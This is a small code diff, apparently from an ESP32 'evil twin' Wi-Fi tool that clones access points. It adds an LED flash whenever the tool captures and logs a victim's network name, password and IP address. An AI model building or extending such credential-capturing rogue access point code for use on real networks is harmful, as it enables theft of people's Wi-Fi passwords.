@@ -5,6 +5,7 @@
 #include <esp_wifi.h>
 #include <vector>
 #include "../utils/logger.h"
+#include "../utils/rgb_led.h"
 #include "../config.h"
 #include "ap_clone.h"
 
@@ -144,6 +145,7 @@ public:
     void addCred(const String& ssid, const String& pass, const String& ip) {
         CapturedCred c{ ssid, pass, ip, millis() };
         captured.push_back(c);
+        RGBLed::get().flashFound();
         LOG.success("[ET] CRED: SSID=\"" + ssid + "\" PASS=\"" + pass + "\" IP=" + ip);
     }
 
